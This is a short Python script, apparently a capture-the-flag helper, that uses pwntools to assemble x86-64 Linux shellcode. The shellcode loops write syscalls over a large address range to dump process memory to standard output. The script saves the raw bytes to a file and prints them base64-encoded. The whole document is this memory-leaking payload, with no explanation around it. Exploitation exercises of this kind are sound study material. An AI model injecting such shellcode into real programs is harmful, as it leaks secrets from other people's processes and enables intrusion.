from pwn import *


import base64
sc = asm("""
    mov r9, 0x2444000
    mov rbx, 0x1
    shl rbx, 0xc
    mov rdx, 0x1000
    mov rdi, 0x1
    L1:
        mov rsi, r9
        mov rax, 0x1
        syscall 
        add r9, rbx
        cmp r9, 0xf444000
        jne L1 
           
    leave
    ret
""",
arch='amd64',
os ='linux'
)

f = open("out4.dump","wb+")
f.write(sc)
f.close()

sc = base64.b64encode(sc)
print(sc)




print(sc)